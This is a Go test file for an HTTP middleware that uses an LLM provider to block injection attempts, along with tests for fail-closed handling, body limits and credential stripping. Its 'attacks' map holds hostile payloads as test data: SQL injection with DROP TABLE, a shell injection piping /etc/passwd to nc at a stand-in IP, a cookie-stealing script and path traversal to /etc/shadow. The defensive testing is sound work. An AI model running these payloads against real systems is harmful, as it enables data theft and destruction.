package main

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/m-mizutani/goerr/v2"
	"github.com/m-mizutani/gt"
	"github.com/m-mizutani/semgate/providers"
	"github.com/m-mizutani/semgate/providers/typesafe"
)

// fakeProvider answers the question with a fixed probability, or fails with
// err, and records what was sent.
type fakeProvider struct {
	probability float64
	err         error

	mu    sync.Mutex
	calls int
	state providers.State
}

func (f *fakeProvider) Evaluate(_ context.Context, req *providers.Request) (*providers.Response, error) {
	f.mu.Lock()
	f.calls++
	f.state = req.State
	f.mu.Unlock()
	if f.err != nil {
		return nil, f.err
	}
	answers := make(map[string]json.RawMessage, len(req.Questions))
	for key := range req.Questions {
		answers[key] = json.RawMessage(`{"type":"noul","noul":` + strconv.FormatFloat(f.probability, 'f', -1, 64) + `}`)
	}
	return &providers.Response{Answers: answers}, nil
}

func (f *fakeProvider) callCount() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.calls
}

func (f *fakeProvider) lastState(t *testing.T) providers.State {
	t.Helper()
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.calls == 0 {
		t.Fatal("the provider was not called")
	}
	return f.state
}

func testRoutes(t *testing.T, client providers.Client) *http.ServeMux {
	t.Helper()
	gate, err := newGate(client, slog.New(slog.NewTextHandler(io.Discard, nil)))
	gt.NoError(t, err).Required()
	return routes(gate)
}

func postChat(body string) *http.Request {
	r := httptest.NewRequest(http.MethodPost, "/chat", strings.NewReader(body))
	r.Header.Set("Content-Type", bodyMediaType)
	return r
}

// serve runs one request and reports the status and whether the handler behind
// the guard answered it.
func serve(h http.Handler, r *http.Request) (int, bool) {
	w := httptest.NewRecorder()
	h.ServeHTTP(w, r)
	return w.Code, strings.Contains(w.Body.String(), `"status":"accepted"`)
}

// attacks are the payloads the guard must block. One question covers all of
// them, so adding a class means changing the question and not the code.
var attacks = map[string]string{
	"SQL injection":  `{"message":"apple' OR 1=1; DROP TABLE users--"}`,
	"shell command":  `{"message":"report.docx; cat /etc/passwd | nc 203.0.113.9 4444"}`,
	"script":         `{"message":"<script>fetch('https://example.net/steal?c='+document.cookie)</script>"}`,
	"path traversal": `{"message":"read the file at ../../../../etc/shadow"}`,
}

// benign are the payloads the guard must let through.
var benign = map[string]string{
	"question": `{"message":"What is your refund policy?"}`,
	"report":   `{"message":"Thanks, upgrading to 1.4.2 fixed the crash for me."}`,
}

func TestGuardBlocksAboveTheLimit(t *testing.T) {
	mux := testRoutes(t, &fakeProvider{probability: 0.95})
	for name, body := range attacks {
		t.Run(name, func(t *testing.T) {
			code, served := serve(mux, postChat(body))
			gt.Number(t, code).Equal(http.StatusForbidden)
			gt.Bool(t, served).False()
		})
	}
}

func TestGuardPassesBelowTheLimit(t *testing.T) {
	mux := testRoutes(t, &fakeProvider{probability: 0.05})
	for name, body := range benign {
		t.Run(name, func(t *testing.T) {
			code, served := serve(mux, postChat(body))
			gt.Number(t, code).Equal(http.StatusOK)
			gt.Bool(t, served).True()
		})
	}
}

// TestGuardPassesAtTheLimit pins the comparison in blockInjection: it blocks
// above 0.8, so an answer exactly at it passes.
func TestGuardPassesAtTheLimit(t *testing.T) {
	mux := testRoutes(t, &fakeProvider{probability: 0.8})
	code, served := serve(mux, postChat(`{"message":"hello"}`))
	gt.Number(t, code).Equal(http.StatusOK)
	gt.Bool(t, served).True()
}

// TestFailClosedAnswersServiceUnavailable pins what a security guard depends
// on: a failed provider call does not serve the request.
func TestFailClosedAnswersServiceUnavailable(t *testing.T) {
	mux := testRoutes(t, &fakeProvider{err: goerr.New("provider is unreachable")})
	code, served := serve(mux, postChat(`{"message":"hello"}`))
	gt.Number(t, code).Equal(http.StatusServiceUnavailable)
	gt.Bool(t, served).False()
}

// TestHealthzIsNotEvaluated checks that a route outside the middleware costs no
// provider call.
func TestHealthzIsNotEvaluated(t *testing.T) {
	fake := &fakeProvider{probability: 0.95}
	mux := testRoutes(t, fake)
	code, served := serve(mux, httptest.NewRequest(http.MethodGet, "/healthz", nil))
	gt.Number(t, code).Equal(http.StatusOK)
	gt.Bool(t, served).True()
	gt.Number(t, fake.callCount()).Equal(0)
}

// TestOversizeBodyIsRejected checks WithOversizeBody(OversizeActionReject): a
// body too large to evaluate is answered 413 instead of evaluated in part.
func TestOversizeBodyIsRejected(t *testing.T) {
	fake := &fakeProvider{probability: 0.05}
	mux := testRoutes(t, fake)
	code, served := serve(mux, postChat(`{"message":"`+strings.Repeat("a", maxBodyBytes)+`"}`))
	gt.Number(t, code).Equal(http.StatusRequestEntityTooLarge)
	gt.Bool(t, served).False()
	gt.Number(t, fake.callCount()).Equal(0)
}

// TestUnsupportedMediaTypeIsRejected checks requireMediaType: a content type
// outside WithBodyContentTypes would be evaluated without its body.
func TestUnsupportedMediaTypeIsRejected(t *testing.T) {
	fake := &fakeProvider{probability: 0.05}
	mux := testRoutes(t, fake)
	for _, contentType := range []string{"application/octet-stream", "text/plain", ""} {
		t.Run("content type "+contentType, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodPost, "/chat", strings.NewReader(attacks["SQL injection"]))
			if contentType != "" {
				r.Header.Set("Content-Type", contentType)
			}
			code, served := serve(mux, r)
			gt.Number(t, code).Equal(http.StatusUnsupportedMediaType)
			gt.Bool(t, served).False()
			gt.Number(t, fake.callCount()).Equal(0)
		})
	}
}

// TestMediaTypeWithParameterIsAccepted pins that the media type is compared and
// not the raw header, so a charset parameter still passes.
func TestMediaTypeWithParameterIsAccepted(t *testing.T) {
	mux := testRoutes(t, &fakeProvider{probability: 0.05})
	r := httptest.NewRequest(http.MethodPost, "/chat", strings.NewReader(`{"message":"hello"}`))
	r.Header.Set("Content-Type", bodyMediaType+"; charset=utf-8")
	code, _ := serve(mux, r)
	gt.Number(t, code).Equal(http.StatusOK)
}

// TestTimeoutsOutlastReadTimeout pins the relations the constants must keep. If
// bodyReadTimeout passed first, the guard would evaluate the part of the body
// that arrived and the handler would still get the rest; if writeTimeout passed
// first, a request still being evaluated would be cut off.
func TestTimeoutsOutlastReadTimeout(t *testing.T) {
	gt.Number(t, int64(bodyReadTimeout)).Greater(int64(readTimeout))
	gt.Number(t, int64(writeTimeout)).Greater(int64(readTimeout))
}

// chunkedBody delivers one part per Read and waits delay before every part
// after the first, so the body is still arriving while the guard waits for it.
type chunkedBody struct {
	parts []string
	delay time.Duration
	at    int
}

func (b *chunkedBody) Read(p []byte) (int, error) {
	if b.at >= len(b.parts) {
		return 0, io.EOF
	}
	if b.at > 0 {
		time.Sleep(b.delay)
	}
	n := copy(p, b.parts[b.at])
	if n < len(b.parts[b.at]) {
		b.parts[b.at] = b.parts[b.at][n:]
		return n, nil
	}
	b.at++
	return n, nil
}

func (b *chunkedBody) Close() error { return nil }

// TestSlowBodyIsEvaluatedWhole checks that a body arriving in parts is
// evaluated in full: the payload is in the part that arrives last.
func TestSlowBodyIsEvaluatedWhole(t *testing.T) {
	fake := &fakeProvider{probability: 0.05}
	mux := testRoutes(t, fake)

	r := httptest.NewRequest(http.MethodPost, "/chat", &chunkedBody{
		parts: []string{`{"message":"look up the invoice `, `where id = 1 OR 1=1--"}`},
		delay: 50 * time.Millisecond,
	})
	r.Header.Set("Content-Type", bodyMediaType)
	mux.ServeHTTP(httptest.NewRecorder(), r)

	state := fake.lastState(t)
	gt.String(t, state.BodyStatus).Equal("complete")
	gt.String(t, state.Body).Contains("1 OR 1=1--")
}

// TestCredentialsAreNotSent checks the header allowlist and the query denylist
// in newGate.
func TestCredentialsAreNotSent(t *testing.T) {
	fake := &fakeProvider{probability: 0.05}
	mux := testRoutes(t, fake)

	r := postChat(`{"message":"hello"}`)
	r.URL.RawQuery = "q=apple&token=secret-token&api_key=secret-key&access_token=secret-access-token"
	r.Header.Set("Authorization", "Bearer secret-key")
	r.Header.Set("Cookie", "session=secret-session")
	r.Header.Set("X-Api-Key", "secret-api-key")
	r.Header.Set("User-Agent", "curl/8.7.1")
	mux.ServeHTTP(httptest.NewRecorder(), r)

	state := fake.lastState(t)
	gt.Map(t, state.Headers).
		NotHasKey("Authorization").NotHasKey("Cookie").NotHasKey("X-Api-Key").
		HasKey("User-Agent").HasKey("Content-Type")
	gt.Map(t, state.Query).
		NotHasKey("token").NotHasKey("api_key").NotHasKey("access_token").
		HasKey("q")
}

// TestGuardLive sends every payload to the real TypeSafe API and requires the
// attacks to be blocked and the benign requests to be served. It runs only when
// TEST_TYPESAFE_API_KEY is set.
func TestGuardLive(t *testing.T) {
	apiKey, ok := os.LookupEnv("TEST_TYPESAFE_API_KEY")
	if !ok {
		t.Skip("TEST_TYPESAFE_API_KEY is not set")
	}
	client, err := typesafe.New(apiKey)
	gt.NoError(t, err).Required()
	mux := testRoutes(t, client)

	for name, body := range attacks {
		t.Run("blocks "+name, func(t *testing.T) {
			code, served := serve(mux, postChat(body))
			gt.Number(t, code).Describef("payload: %s", body).Equal(http.StatusForbidden)
			gt.Bool(t, served).False()
		})
	}
	for name, body := range benign {
		t.Run("passes "+name, func(t *testing.T) {
			code, served := serve(mux, postChat(body))
			gt.Number(t, code).Describef("payload: %s", body).Equal(http.StatusOK)
			gt.Bool(t, served).True()
		})
	}
}
